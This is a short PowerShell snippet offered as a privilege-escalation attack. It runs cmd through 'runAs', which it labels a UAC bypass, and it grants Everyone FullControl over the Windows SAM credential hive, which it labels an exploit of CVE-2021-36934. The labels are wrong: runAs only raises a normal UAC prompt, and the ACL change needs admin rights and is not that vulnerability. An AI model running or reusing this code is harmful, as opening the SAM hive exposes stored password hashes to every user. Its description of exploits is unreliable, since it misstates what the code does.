# Elevate privileges using UAC bypass
Start-Process cmd -Verb runAs

# Example for exploiting a known vulnerability (CVE-2021-36934)
$acl = Get-Acl -Path "C:\Windows\System32\config\SAM"
$acl.SetAccessRuleProtection($True, $False)
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
$acl.AddAccessRule($rule)
Set-Acl -Path "C:\Windows\System32\config\SAM" -AclObject $acl
